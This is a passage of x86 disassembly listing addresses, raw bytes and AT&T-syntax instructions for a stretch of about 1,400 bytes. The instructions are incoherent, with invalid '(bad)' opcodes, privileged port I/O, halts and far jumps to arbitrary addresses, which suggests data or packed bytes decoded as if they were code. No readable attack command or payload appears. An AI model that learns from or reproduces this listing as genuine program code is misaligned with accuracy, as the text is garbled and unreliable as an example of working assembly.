  431cd4:	5a                   	pop    %edx
  431cd5:	af                   	scas   %es:(%edi),%eax
  431cd6:	37                   	aaa
  431cd7:	f6 6f 5d             	imulb  0x5d(%edi)
  431cda:	9c                   	pushf
  431cdb:	d6                   	salc
  431cdc:	d8 fa                	fdivr  %st(2),%st
  431cde:	63 fe                	arpl   %edi,%esi
  431ce0:	a0 7e 68 28 c9       	mov    0xc928687e,%al
  431ce5:	2d 7f e2 2b eb       	sub    $0xeb2be27f,%eax
  431cea:	e8 2a 81 18 14       	call   0x145b9e19
  431cef:	63 46 61             	arpl   %eax,0x61(%esi)
  431cf2:	12 8e 51 5c 4e 1c    	adc    0x1c4e5c51(%esi),%cl
  431cf8:	b3 3c                	mov    $0x3c,%bl
  431cfa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431cfb:	79 79                	jns    0x431d76
  431cfd:	2b d5                	sub    %ebp,%edx
  431cff:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  431d00:	d6                   	salc
  431d01:	00 61 bc             	add    %ah,-0x44(%ecx)
  431d04:	ab                   	stos   %eax,%es:(%edi)
  431d05:	ab                   	stos   %eax,%es:(%edi)
  431d06:	27                   	daa
  431d07:	72 1a                	jb     0x431d23
  431d09:	48                   	dec    %eax
  431d0a:	7d a8                	jge    0x431cb4
  431d0c:	64 30 d6             	fs xor %dl,%dh
  431d0f:	ab                   	stos   %eax,%es:(%edi)
  431d10:	ea 26 55 7e d4 31 a8 	ljmp   $0xa831,$0xd47e5526
  431d17:	e6 0a                	out    %al,$0xa
  431d19:	89 3c de             	mov    %edi,(%esi,%ebx,8)
  431d1c:	8d 5c b9 de          	lea    -0x22(%ecx,%edi,4),%ebx
  431d20:	02 8d 82 f2 0a 13    	add    0x130af282(%ebp),%cl
  431d26:	02 b7 18 0e 73 46    	add    0x46730e18(%edi),%dh
  431d2c:	0b 13                	or     (%ebx),%edx
  431d2e:	f4                   	hlt
  431d2f:	d4 e1                	aam    $0xe1
  431d31:	72 4b                	jb     0x431d7e
  431d33:	f7 6b 55             	imull  0x55(%ebx)
  431d36:	c6                   	(bad)
  431d37:	90                   	nop
  431d38:	2b f6                	sub    %esi,%esi
  431d3a:	5c                   	pop    %esp
  431d3b:	a1 89 eb 01 67       	mov    0x6701eb89,%eax
  431d40:	a1 2d ba 5f 35       	mov    0x355fba2d,%eax
  431d45:	14 2e                	adc    $0x2e,%al
  431d47:	96                   	xchg   %eax,%esi
  431d48:	f0 db 3e             	lock fstpt (%esi)
  431d4b:	28 90 4d 3b 02 04    	sub    %dl,0x4023b4d(%eax)
  431d51:	de 60 b5             	fisubs -0x4b(%eax)
  431d54:	2b e8                	sub    %eax,%ebp
  431d56:	5f                   	pop    %edi
  431d57:	2a e7                	sub    %bh,%ah
  431d59:	38 42 60             	cmp    %al,0x60(%edx)
  431d5c:	e2 d5                	loop   0x431d33
  431d5e:	83 af 17 a9 3f 48 b0 	subl   $0xffffffb0,0x483fa917(%edi)
  431d65:	24 d2                	and    $0xd2,%al
  431d67:	1d 89 fa 19 45       	sbb    $0x4519fa89,%eax
  431d6c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431d6d:	3a 9d ea a7 20 ca    	cmp    -0x35df5816(%ebp),%bl
  431d73:	7a 41                	jp     0x431db6
  431d75:	26 c6                	es (bad)
  431d77:	98                   	cwtl
  431d78:	01 28                	add    %ebp,(%eax)
  431d7a:	73 b5                	jae    0x431d31
  431d7c:	7f c4                	jg     0x431d42
  431d7e:	88 58 c5             	mov    %bl,-0x3b(%eax)
  431d81:	79 c4                	jns    0x431d47
  431d83:	1a 28                	sbb    (%eax),%ch
  431d85:	08 56 25             	or     %dl,0x25(%esi)
  431d88:	87 41 53             	xchg   %eax,0x53(%ecx)
  431d8b:	3b 85 2b 17 33 0c    	cmp    0xc33172b(%ebp),%eax
  431d91:	68 d9 9d 79 c0       	push   $0xc0799dd9
  431d96:	d8 4b 61             	fmuls  0x61(%ebx)
  431d99:	84 ec                	test   %ch,%ah
  431d9b:	a9 f2 18 4a d9       	test   $0xd94a18f2,%eax
  431da0:	e9 fe 11 04 05       	jmp    0x5472fa3
  431da5:	57                   	push   %edi
  431da6:	44                   	inc    %esp
  431da7:	47                   	inc    %edi
  431da8:	bd e1 77 f3 5c       	mov    $0x5cf377e1,%ebp
  431dad:	39 3e                	cmp    %edi,(%esi)
  431daf:	47                   	inc    %edi
  431db0:	07                   	pop    %es
  431db1:	1a 1a                	sbb    (%edx),%bl
  431db3:	3a 4e cb             	cmp    -0x35(%esi),%cl
  431db6:	27                   	daa
  431db7:	ff 4f 17             	decl   0x17(%edi)
  431dba:	22 64 2e 8d          	and    -0x73(%esi,%ebp,1),%ah
  431dbe:	cf                   	iret
  431dbf:	96                   	xchg   %eax,%esi
  431dc0:	08 23                	or     %ah,(%ebx)
  431dc2:	86 35 ad e3 b2 ff    	xchg   %dh,0xffb2e3ad
  431dc8:	7f c6                	jg     0x431d90
  431dca:	24 f2                	and    $0xf2,%al
  431dcc:	10 a9 eb 18 74 d3    	adc    %ch,-0x2c8be715(%ecx)
  431dd2:	0d 07 09 8f 77       	or     $0x778f0907,%eax
  431dd7:	9b                   	fwait
  431dd8:	68 a7 64 9e a9       	push   $0xa99e64a7
  431ddd:	ee                   	out    %al,(%dx)
  431dde:	d8 27                	fsubs  (%edi)
  431de0:	08 5c 94 60          	or     %bl,0x60(%esp,%edx,4)
  431de4:	23 98 90 de c3 d3    	and    -0x2c3c2170(%eax),%ebx
  431dea:	37                   	aaa
  431deb:	5f                   	pop    %edi
  431dec:	f5                   	cmc
  431ded:	21 e7                	and    %esp,%edi
  431def:	16                   	push   %ss
  431df0:	cc                   	int3
  431df1:	2a a1 67 b6 30 64    	sub    0x6430b667(%ecx),%ah
  431df7:	da 16                	ficoml (%esi)
  431df9:	71 d6                	jno    0x431dd1
  431dfb:	73 cf                	jae    0x431dcc
  431dfd:	20 01                	and    %al,(%ecx)
  431dff:	80 45 9e b6          	addb   $0xb6,-0x62(%ebp)
  431e03:	12 15 0a 54 68 c9    	adc    0xc968540a,%dl
  431e09:	02 3c 91             	add    (%ecx,%edx,4),%bh
  431e0c:	26 0e                	es push %cs
  431e0e:	d2 e3                	shl    %cl,%bl
  431e10:	00 12                	add    %dl,(%edx)
  431e12:	02 8c 32 cc 1e ca b4 	add    -0x4b35e134(%edx,%esi,1),%cl
  431e19:	12 36                	adc    (%esi),%dh
  431e1b:	60                   	pusha
  431e1c:	db f6                	fcomi  %st(6),%st
  431e1e:	e0 91                	loopne 0x431db1
  431e20:	0f 6b a0 93 22 9a 23 	packssdw 0x239a2293(%eax),%mm4
  431e27:	e9 ed 05 5b c8       	jmp    0xc89e2419
  431e2c:	ff 46 cf             	incl   -0x31(%esi)
  431e2f:	7e 4c                	jle    0x431e7d
  431e31:	9c                   	pushf
  431e32:	fd                   	std
  431e33:	66 4e                	dec    %si
  431e35:	cb                   	lret
  431e36:	96                   	xchg   %eax,%esi
  431e37:	72 74                	jb     0x431ead
  431e39:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431e3a:	2d b6 4d a9 c8       	sub    $0xc8a94db6,%eax
  431e3f:	e9 8e c8 5c f3       	jmp    0xf39fe6d2
  431e44:	3a 1c f5 ea 31 24 e1 	cmp    -0x1edbce16(,%esi,8),%bl
  431e4b:	0a fe                	or     %dh,%bh
  431e4d:	e8 b5 50 84 5f       	call   0x5fc76f07
  431e52:	c0 c1 ae             	rol    $0xae,%cl
  431e55:	eb be                	jmp    0x431e15
  431e57:	59                   	pop    %ecx
  431e58:	53                   	push   %ebx
  431e59:	ff                   	(bad)
  431e5a:	fe                   	(bad)
  431e5b:	b3 9c                	mov    $0x9c,%bl
  431e5d:	b3 49                	mov    $0x49,%bl
  431e5f:	fe c5                	inc    %ch
  431e61:	98                   	cwtl
  431e62:	e8 64 9d 98 20       	call   0x20dbbbcb
  431e67:	11 6d 21             	adc    %ebp,0x21(%ebp)
  431e6a:	87 8c 7d 1f c7 f5 b4 	xchg   %ecx,-0x4b0a38e1(%ebp,%edi,2)
  431e71:	4e                   	dec    %esi
  431e72:	d9 2c f3             	fldcw  (%ebx,%esi,8)
  431e75:	40                   	inc    %eax
  431e76:	f0 23 9e 64 2d b8 34 	lock and 0x34b82d64(%esi),%ebx
  431e7d:	98                   	cwtl
  431e7e:	93                   	xchg   %eax,%ebx
  431e7f:	8d b7 cf d1 82 6e    	lea    0x6e82d1cf(%edi),%esi
  431e85:	c9                   	leave
  431e86:	11 47 b7             	adc    %eax,-0x49(%edi)
  431e89:	11 d2                	adc    %edx,%edx
  431e8b:	72 39                	jb     0x431ec6
  431e8d:	1e                   	push   %ds
  431e8e:	ef                   	out    %eax,(%dx)
  431e8f:	30 64 cf 3d          	xor    %ah,0x3d(%edi,%ecx,8)
  431e93:	9e                   	sahf
  431e94:	e8 43 f3 70 7e       	call   0x7eb411dc
  431e99:	22 f6                	and    %dh,%dh
  431e9b:	36 47                	ss inc %edi
  431e9d:	32 4d 77             	xor    0x77(%ebp),%cl
  431ea0:	13 80 18 8f 72 cd    	adc    -0x328d70e8(%eax),%eax
  431ea6:	02 0a                	add    (%edx),%cl
  431ea8:	d0 ac 43 1e 61 a3 1c 	shrb   $1,0x1ca3611e(%ebx,%eax,2)
  431eaf:	d2 4d 40             	rorb   %cl,0x40(%ebp)
  431eb2:	7b 3a                	jnp    0x431eee
  431eb4:	53                   	push   %ebx
  431eb5:	8e ce                	mov    %esi,%cs
  431eb7:	ad                   	lods   %ds:(%esi),%eax
  431eb8:	f7 cb e0 2e 6f f7    	test   $0xf76f2ee0,%ebx
  431ebe:	48                   	dec    %eax
  431ebf:	a3 b6 57 62 81       	mov    %eax,0x816257b6
  431ec4:	2d 2f 8e 9a e0       	sub    $0xe09a8e2f,%eax
  431ec9:	5c                   	pop    %esp
  431eca:	67 0e                	addr16 push %cs
  431ecc:	40                   	inc    %eax
  431ecd:	e0 ab                	loopne 0x431e7a
  431ecf:	71 4b                	jno    0x431f1c
  431ed1:	23 90 20 30 1a 93    	and    -0x6ce5cfe0(%eax),%edx
  431ed7:	4d                   	dec    %ebp
  431ed8:	05 bf ac 5f c8       	add    $0xc85facbf,%eax
  431edd:	04 74                	add    $0x74,%al
  431edf:	33 83 b8 dc 4b 74    	xor    0x744bdcb8(%ebx),%eax
  431ee5:	d2 b2 6e 10 72 19    	shlb   %cl,0x1972106e(%edx)
  431eeb:	50                   	push   %eax
  431eec:	1a 52 52             	sbb    0x52(%edx),%dl
  431eef:	fc                   	cld
  431ef0:	25 d3 92 bd 25       	and    $0x25bd92d3,%eax
  431ef5:	94                   	xchg   %eax,%esp
  431ef6:	60                   	pusha
  431ef7:	c3                   	ret
  431ef8:	0f 9f 18             	setg   (%eax)
  431efb:	06                   	push   %es
  431efc:	5d                   	pop    %ebp
  431efd:	eb 9d                	jmp    0x431e9c
  431eff:	b2 79                	mov    $0x79,%dl
  431f01:	21 39                	and    %edi,(%ecx)
  431f03:	84 d2                	test   %dl,%dl
  431f05:	dd 7d 3c             	fnstsw 0x3c(%ebp)
  431f08:	56                   	push   %esi
  431f09:	18 4c ed b3          	sbb    %cl,-0x4d(%ebp,%ebp,8)
  431f0d:	36 9f                	ss lahf
  431f0f:	b8 e2 84 0c 18       	mov    $0x180c84e2,%eax
  431f14:	77 0d                	ja     0x431f23
  431f16:	6e                   	outsb  %ds:(%esi),(%dx)
  431f17:	db 45 1f             	fildl  0x1f(%ebp)
  431f1a:	2f                   	das
  431f1b:	84 40 a9             	test   %al,-0x57(%eax)
  431f1e:	db 4d a8             	fisttpl -0x58(%ebp)
  431f21:	fd                   	std
  431f22:	d9 23                	fldenv (%ebx)
  431f24:	93                   	xchg   %eax,%ebx
  431f25:	90                   	nop
  431f26:	c4                   	(bad)
  431f27:	ef                   	out    %eax,(%dx)
  431f28:	45                   	inc    %ebp
  431f29:	53                   	push   %ebx
  431f2a:	c4                   	(bad)
  431f2b:	c0 40 b1 c1          	rolb   $0xc1,-0x4f(%eax)
  431f2f:	b2 69                	mov    $0x69,%dl
  431f31:	95                   	xchg   %eax,%ebp
  431f32:	34 c1                	xor    $0xc1,%al
  431f34:	0d fd a7 ab d3       	or     $0xd3aba7fd,%eax
  431f39:	3f                   	aas
  431f3a:	43                   	inc    %ebx
  431f3b:	21 55 54             	and    %edx,0x54(%ebp)
  431f3e:	45                   	inc    %ebp
  431f3f:	ba 3d cb 36 6c       	mov    $0x6c36cb3d,%edx
  431f44:	1d 04 9b 83 52       	sbb    $0x52839b04,%eax
  431f49:	a2 b1 ca 5e 26       	mov    %al,0x265ecab1
  431f4e:	28 da                	sub    %bl,%dl
  431f50:	d7                   	xlat   %ds:(%ebx)
  431f51:	f6 e0                	mul    %al
  431f53:	1b 4c 47 cc          	sbb    -0x34(%edi,%eax,2),%ecx
  431f57:	95                   	xchg   %eax,%ebp
  431f58:	49                   	dec    %ecx
  431f59:	22 c1                	and    %cl,%al
  431f5b:	c6 47 ae 34          	movb   $0x34,-0x52(%edi)
  431f5f:	da 67 e0             	fisubl -0x20(%edi)
  431f62:	b5 47                	mov    $0x47,%ch
  431f64:	a0 6c 37 4f cd       	mov    0xcd4f376c,%al
  431f69:	7a db                	jp     0x431f46
  431f6b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431f6c:	c3                   	ret
  431f6d:	4d                   	dec    %ebp
  431f6e:	b2 3b                	mov    $0x3b,%dl
  431f70:	2d fe 43 dd c9       	sub    $0xc9dd43fe,%eax
  431f75:	59                   	pop    %ecx
  431f76:	5b                   	pop    %ebx
  431f77:	92                   	xchg   %eax,%edx
  431f78:	85 b2 73 3d 56 28    	test   %esi,0x28563d73(%edx)
  431f7e:	09 0b                	or     %ecx,(%ebx)
  431f80:	04 ca                	add    $0xca,%al
  431f82:	1e                   	push   %ds
  431f83:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431f84:	91                   	xchg   %eax,%ecx
  431f85:	91                   	xchg   %eax,%ecx
  431f86:	36 74 78             	ss je  0x432001
  431f89:	19 56 4d             	sbb    %edx,0x4d(%esi)
  431f8c:	3c 2e                	cmp    $0x2e,%al
  431f8e:	73 f7                	jae    0x431f87
  431f90:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431f91:	63 4f d9             	arpl   %ecx,-0x27(%edi)
  431f94:	6f                   	outsl  %ds:(%esi),(%dx)
  431f95:	80 fe 2c             	cmp    $0x2c,%dh
  431f98:	d0 aa 7e bc b5 fc    	shrb   $1,-0x34a4382(%edx)
  431f9e:	84 d8                	test   %bl,%al
  431fa0:	96                   	xchg   %eax,%esi
  431fa1:	da de                	fcmovu %st(6),%st
  431fa3:	8c 6b 63             	mov    %gs,0x63(%ebx)
  431fa6:	dd f3                	(bad)
  431fa8:	a1 5c b4 ba 3c       	mov    0x3cbab45c,%eax
  431fad:	16                   	push   %ss
  431fae:	e7 10                	out    %eax,$0x10
  431fb0:	e8 cf 6d 4e bb       	call   0xbb918d84
  431fb5:	ef                   	out    %eax,(%dx)
  431fb6:	f6 44 f1 2b 81       	testb  $0x81,0x2b(%ecx,%esi,8)
  431fbb:	ad                   	lods   %ds:(%esi),%eax
  431fbc:	fd                   	std
  431fbd:	59                   	pop    %ecx
  431fbe:	bc dd 9f 21 33       	mov    $0x33219fdd,%esp
  431fc3:	40                   	inc    %eax
  431fc4:	5e                   	pop    %esi
  431fc5:	7a 4d                	jp     0x432014
  431fc7:	e3 d8                	jecxz  0x431fa1
  431fc9:	a1 9f 86 a9 64       	mov    0x64a9869f,%eax
  431fce:	fc                   	cld
  431fcf:	4b                   	dec    %ebx
  431fd0:	7e bf                	jle    0x431f91
  431fd2:	d3 98 a8 ee 3a 30    	rcrl   %cl,0x303aeea8(%eax)
  431fd8:	6a e8                	push   $0xffffffe8
  431fda:	40                   	inc    %eax
  431fdb:	ca fb 57             	lret   $0x57fb
  431fde:	2d 5f 46 3f 7a       	sub    $0x7a3f465f,%eax
  431fe3:	fb                   	sti
  431fe4:	e1 80                	loope  0x431f66
  431fe6:	86 da                	xchg   %bl,%dl
  431fe8:	e4 80                	in     $0x80,%al
  431fea:	11 d0                	adc    %edx,%eax
  431fec:	e4 fe                	in     $0xfe,%al
  431fee:	60                   	pusha
  431fef:	98                   	cwtl
  431ff0:	c6                   	(bad)
  431ff1:	50                   	push   %eax
  431ff2:	93                   	xchg   %eax,%ebx
  431ff3:	47                   	inc    %edi
  431ff4:	75 67                	jne    0x43205d
  431ff6:	6d                   	insl   (%dx),%es:(%edi)
  431ff7:	05 68 98 a6 fd       	add    $0xfda69868,%eax
  431ffc:	98                   	cwtl
  431ffd:	31 e0                	xor    %esp,%eax
  431fff:	2f                   	das
  432000:	68 7e 29 c2 5e       	push   $0x5ec2297e
  432005:	6e                   	outsb  %ds:(%esi),(%dx)
  432006:	c9                   	leave
  432007:	80 ae 21 ed f5 3d d9 	subb   $0xd9,0x3df5ed21(%esi)
  43200e:	b9 ea c2 88 d2       	mov    $0xd288c2ea,%ecx
  432013:	1e                   	push   %ds
  432014:	0d 1f 08 25 00       	or     $0x25081f,%eax
  432019:	9f                   	lahf
  43201a:	c6                   	(bad)
  43201b:	af                   	scas   %es:(%edi),%eax
  43201c:	6a a7                	push   $0xffffffa7
  43201e:	91                   	xchg   %eax,%ecx
  43201f:	53                   	push   %ebx
  432020:	d5 05                	aad    $0x5
  432022:	6b cf 69             	imul   $0x69,%edi,%ecx
  432025:	f1                   	int1
  432026:	fc                   	cld
  432027:	9a a5 81 80 d7 74 1b 	lcall  $0x1b74,$0xd78081a5
  43202e:	42                   	inc    %edx
  43202f:	59                   	pop    %ecx
  432030:	c3                   	ret
  432031:	42                   	inc    %edx
  432032:	d3 f7                	shl    %cl,%edi
  432034:	eb bf                	jmp    0x431ff5
  432036:	f5                   	cmc
  432037:	7a 26                	jp     0x43205f
  432039:	c3                   	ret
  43203a:	72 1c                	jb     0x432058
  43203c:	55                   	push   %ebp
  43203d:	77 b6                	ja     0x431ff5
  43203f:	3b 3d 51 aa 7a c4    	cmp    0xc47aaa51,%edi
  432045:	5c                   	pop    %esp
  432046:	4d                   	dec    %ebp
  432047:	37                   	aaa
  432048:	d0 a8 7b 87 1a 79    	shrb   $1,0x791a877b(%eax)
  43204e:	cf                   	iret
  43204f:	cb                   	lret
  432050:	c5 3a                	lds    (%edx),%edi
  432052:	1b a4 bb 5c cf d4 fd 	sbb    -0x22b30a4(%ebx,%edi,4),%esp
  432059:	6e                   	outsb  %ds:(%esi),(%dx)
  43205a:	99                   	cltd
  43205b:	f8                   	clc
  43205c:	5b                   	pop    %ebx
  43205d:	2b 70 d8             	sub    -0x28(%eax),%esi
  432060:	82 c9 23             	or     $0x23,%cl
  432063:	e2 a5                	loop   0x43200a
  432065:	1d e9 db 6b 4d       	sbb    $0x4d6bdbe9,%eax
  43206a:	b0 13                	mov    $0x13,%al
  43206c:	33 af 67 7c e7 a7    	xor    -0x58188399(%edi),%ebp
  432072:	dc 1e                	fcompl (%esi)
  432074:	2d 2a cd fe 92       	sub    $0x92fecd2a,%eax
  432079:	34 01                	xor    $0x1,%al
  43207b:	db f0                	fcomi  %st(0),%st
  43207d:	c9                   	leave
  43207e:	16                   	push   %ss
  43207f:	15 fd c1 a6 9a       	adc    $0x9aa6c1fd,%eax
  432084:	c3                   	ret
  432085:	a8 6e                	test   $0x6e,%al
  432087:	b1 33                	mov    $0x33,%cl
  432089:	c2 a3 1e             	ret    $0x1ea3
  43208c:	05 1e 7e be 8e       	add    $0x8ebe7e1e,%eax
  432091:	37                   	aaa
  432092:	94                   	xchg   %eax,%esp
  432093:	a2 bf 43 38 5e       	mov    %al,0x5e3843bf
  432098:	12 fc                	adc    %ah,%bh
  43209a:	28 84 a3 56 61 60 66 	sub    %al,0x66606156(%ebx,%eiz,4)
  4320a1:	2d d1 2f 9b 3f       	sub    $0x3f9b2fd1,%eax
  4320a6:	38 e2                	cmp    %ah,%dl
  4320a8:	b6 f8                	mov    $0xf8,%dh
  4320aa:	1d 5b 70 fd 8a       	sbb    $0x8afd705b,%eax
  4320af:	7c 39                	jl     0x4320ea
  4320b1:	8e d0                	mov    %eax,%ss
  4320b3:	ee                   	out    %al,(%dx)
  4320b4:	b1 31                	mov    $0x31,%cl
  4320b6:	26 9e                	es sahf
  4320b8:	5c                   	pop    %esp
  4320b9:	ae                   	scas   %es:(%edi),%al
  4320ba:	00 e2                	add    %ah,%dl
  4320bc:	0d a0 4f cc c7       	or     $0xc7cc4fa0,%eax
  4320c1:	43                   	inc    %ebx
  4320c2:	54                   	push   %esp
  4320c3:	b6 c6                	mov    $0xc6,%dh
  4320c5:	16                   	push   %ss
  4320c6:	92                   	xchg   %eax,%edx
  4320c7:	4b                   	dec    %ebx
  4320c8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4320c9:	d7                   	xlat   %ds:(%ebx)
  4320ca:	80 36 cc             	xorb   $0xcc,(%esi)
  4320cd:	69 eb a3 1b bb 99    	imul   $0x99bb1ba3,%ebx,%ebp
  4320d3:	91                   	xchg   %eax,%ecx
  4320d4:	ed                   	in     (%dx),%eax
  4320d5:	da 4e af             	fimull -0x51(%esi)
  4320d8:	aa                   	stos   %al,%es:(%edi)
  4320d9:	7a fa                	jp     0x4320d5
  4320db:	4f                   	dec    %edi
  4320dc:	2e 33 5a b6          	xor    %cs:-0x4a(%edx),%ebx
  4320e0:	bb 32 5d 5b c3       	mov    $0xc35b5d32,%ebx
  4320e5:	f0 8c 27             	lock mov %fs,(%edi)
  4320e8:	2d 6b 68 e9 a0       	sub    $0xa0e9686b,%eax
  4320ed:	e2 94                	loop   0x432083
  4320ef:	bd f3 6b 86 51       	mov    $0x51866bf3,%ebp
  4320f4:	45                   	inc    %ebp
  4320f5:	b5 91                	mov    $0x91,%ch
  4320f7:	02 07                	add    (%edi),%al
  4320f9:	ee                   	out    %al,(%dx)
  4320fa:	9c                   	pushf
  4320fb:	3c ab                	cmp    $0xab,%al
  4320fd:	93                   	xchg   %eax,%ebx
  4320fe:	1d 95 22 43 d6       	sbb    $0xd6432295,%eax
  432103:	6a fd                	push   $0xfffffffd
  432105:	9a 3d fa 21 19 2a a0 	lcall  $0xa02a,$0x1921fa3d
  43210c:	eb fa                	jmp    0x432108
  43210e:	8e 74 6a 27          	mov    0x27(%edx,%ebp,2),%?
  432112:	09 e1                	or     %esp,%ecx
  432114:	d8 d2                	fcom   %st(2)
  432116:	e8 4f 20 fb 49       	call   0x4a3e416a
  43211b:	7b 5e                	jnp    0x43217b
  43211d:	b2 b2                	mov    $0xb2,%dl
  43211f:	ab                   	stos   %eax,%es:(%edi)
  432120:	d2 3b                	sarb   %cl,(%ebx)
  432122:	ec                   	in     (%dx),%al
  432123:	8f 08 9f e3          	(bad)
  432127:	c5 38                	lds    (%eax),%edi
  432129:	ee                   	out    %al,(%dx)
  43212a:	46                   	inc    %esi
  43212b:	d7                   	xlat   %ds:(%ebx)
  43212c:	b5 2f                	mov    $0x2f,%ch
  43212e:	e6 41                	out    %al,$0x41
  432130:	d6                   	salc
  432131:	91                   	xchg   %eax,%ecx
  432132:	d9 1f                	fstps  (%edi)
  432134:	ac                   	lods   %ds:(%esi),%al
  432135:	df 7b 91             	fistpll -0x6f(%ebx)
  432138:	30 2e                	xor    %ch,(%esi)
  43213a:	82 5e 49 54          	sbbb   $0x54,0x49(%esi)
  43213e:	60                   	pusha
  43213f:	c5 b8 5d 08 88 57    	lds    0x5788085d(%eax),%edi
  432145:	0e                   	push   %cs
  432146:	b3 e1                	mov    $0xe1,%bl
  432148:	e5 bd                	in     $0xbd,%eax
  43214a:	4d                   	dec    %ebp
  43214b:	c1 2c 35 1b c6 c5 19 	shrl   $0xf9,0x19c5c61b(,%esi,1)
  432152:	f9 
  432153:	cf                   	iret
  432154:	b4 f8                	mov    $0xf8,%ah
  432156:	05 a3 ea e7 6d       	add    $0x6de7eaa3,%eax
  43215b:	d2 4c 7d c0          	rorb   %cl,-0x40(%ebp,%edi,2)
  43215f:	4a                   	dec    %edx
  432160:	76 8c                	jbe    0x4320ee
  432162:	6d                   	insl   (%dx),%es:(%edi)
  432163:	da 2e                	fisubrl (%esi)
  432165:	55                   	push   %ebp
  432166:	9d                   	popf
  432167:	2c a6                	sub    $0xa6,%al
  432169:	d4 4f                	aam    $0x4f
  43216b:	ec                   	in     (%dx),%al
  43216c:	3a 77 3d             	cmp    0x3d(%edi),%dh
  43216f:	53                   	push   %ebx
  432170:	3a 96 7a a5 26 34    	cmp    0x3426a57a(%esi),%dl
  432176:	ee                   	out    %al,(%dx)
  432177:	43                   	inc    %ebx
  432178:	5c                   	pop    %esp
  432179:	f5                   	cmc
  43217a:	14 23                	adc    $0x23,%al
  43217c:	0c 3b                	or     $0x3b,%al
  43217e:	61                   	popa
  43217f:	0d cc 2c 22 e6       	or     $0xe6222ccc,%eax
  432184:	7c f3                	jl     0x432179
  432186:	b4 b6                	mov    $0xb6,%ah
  432188:	37                   	aaa
  432189:	eb 07                	jmp    0x432192
  43218b:	21 43 c7             	and    %eax,-0x39(%ebx)
  43218e:	1f                   	pop    %ds
  43218f:	8a cb                	mov    %bl,%cl
  432191:	2e 5a                	cs pop %edx
  432193:	b8 d2 18 36 aa       	mov    $0xaa3618d2,%eax
  432198:	5e                   	pop    %esi
  432199:	96                   	xchg   %eax,%esi
  43219a:	79 89                	jns    0x432125
  43219c:	4c                   	dec    %esp
  43219d:	2f                   	das
  43219e:	0b 67 4d             	or     0x4d(%edi),%esp
  4321a1:	3b a6 ed f8 70 42    	cmp    0x4270f8ed(%esi),%esp
  4321a7:	17                   	pop    %ss
  4321a8:	78 ad                	js     0x432157
  4321aa:	e1 55                	loope  0x432201
  4321ac:	73 11                	jae    0x4321bf
  4321ae:	68 75 6c 75 b5       	push   $0xb5756c75
  4321b3:	bd fe 92 8b 03       	mov    $0x38b92fe,%ebp
  4321b8:	8a a7 e8 f2 2d 0f    	mov    0xf2df2e8(%edi),%ah
  4321be:	51                   	push   %ecx
  4321bf:	50                   	push   %eax
  4321c0:	51                   	push   %ecx
  4321c1:	b2 9a                	mov    $0x9a,%dl
  4321c3:	35 7e 2d 0b 3b       	xor    $0x3b0b2d7e,%eax
  4321c8:	86 d4                	xchg   %dl,%ah
  4321ca:	bd 34 6d 07 12       	mov    $0x12076d34,%ebp
  4321cf:	c1 63 b1 71          	shll   $0x71,-0x4f(%ebx)
  4321d3:	bd fa 4c f5 3c       	mov    $0x3cf54cfa,%ebp
  4321d8:	64 6d                	fs insl (%dx),%es:(%edi)
  4321da:	b3 59                	mov    $0x59,%bl
  4321dc:	b9 21 39 54 09       	mov    $0x9543921,%ecx
  4321e1:	87 e4                	xchg   %esp,%esp
  4321e3:	15 d3 b7 72 c8       	adc    $0xc872b7d3,%eax
  4321e8:	90                   	nop
  4321e9:	63 b4 02 bc 13 70 c2 	arpl   %esi,-0x3d8fec44(%edx,%eax,1)
  4321f0:	94                   	xchg   %eax,%esp
  4321f1:	ba ce 99 05 cb       	mov    $0xcb0599ce,%edx
  4321f6:	10 18                	adc    %bl,(%eax)
  4321f8:	84 fe                	test   %bh,%dh
  4321fa:	36 d3 f9             	ss sar %cl,%ecx
  4321fd:	15 1c 3c 61 fa       	adc    $0xfa613c1c,%eax
  432202:	45                   	inc    %ebp
  432203:	62 20                	bound  %esp,(%eax)
  432205:	d6                   	salc
  432206:	01 57 7e             	add    %edx,0x7e(%edi)
  432209:	23 00                	and    (%eax),%eax
  43220b:	fa                   	cli
  43220c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  43220d:	35 2d db b1 a2       	xor    $0xa2b1db2d,%eax
  432212:	d6                   	salc
  432213:	8b 61 58             	mov    0x58(%ecx),%esp
  432216:	10 2c 19             	adc    %ch,(%ecx,%ebx,1)
  432219:	26 34 b4             	es xor $0xb4,%al
  43221c:	2c 57                	sub    $0x57,%al
  43221e:	e2 7f                	loop   0x43229f
  432220:	f3 e7 05             	repz out %eax,$0x5
  432223:	04 9c                	add    $0x9c,%al
  432225:	57                   	push   %edi
  432226:	27                   	daa
  432227:	63 89 a6 da fa 74    	arpl   %ecx,0x74fadaa6(%ecx)
  43222d:	8d 84 d2 cd fa 5c 83 	lea    -0x7ca30533(%edx,%edx,8),%eax
  432234:	50                   	push   %eax
  432235:	07                   	pop    %es
  432236:	50                   	push   %eax
  432237:	34 4c                	xor    $0x4c,%al
  432239:	26 10 b1 3c d0 a9 ec 	adc    %dh,%es:-0x13562fc4(%ecx)
  432240:	48                   	dec    %eax
  432241:	9d                   	popf
  432242:	33 f5                	xor    %ebp,%esi
  432244:	a9 76 83 8b 69       	test   $0x698b8376,%eax
  432249:	58                   	pop    %eax
  43224a:	6e                   	outsb  %ds:(%esi),(%dx)
  43224b:	28 ee                	sub    %ch,%dh
  43224d:	20 c4                	and    %al,%ah
  43224f:	75 7d                	jne    0x4322ce
  432251:	6b b5 3a 6d 63 b7 fb 	imul   $0xfffffffb,-0x489c92c6(%ebp),%esi
  432258:	c1 9b 14 dc e9 80 6d 	rcrl   $0x6d,-0x7f1623ec(%ebx)
  43225f:	42                   	inc    %edx
  432260:	90                   	nop
  432261:	2f                   	das
  432262:	cd fa                	int    $0xfa
  432264:	c0 2f d8             	shrb   $0xd8,(%edi)
  432267:	53                   	push   %ebx
  432268:	57                   	push   %edi
  432269:	73 b2                	jae    0x43221d
  43226b:	0c bb                	or     $0xbb,%al
  43226d:	e7 65                	out    %eax,$0x65
  43226f:	17                   	pop    %ss
  432270:	2d 0a 9a 3c de       	sub    $0xde3c9a0a,%eax
  432275:	0e                   	push   %cs
  432276:	fa                   	cli
  432277:	87 31                	xchg   %esi,(%ecx)
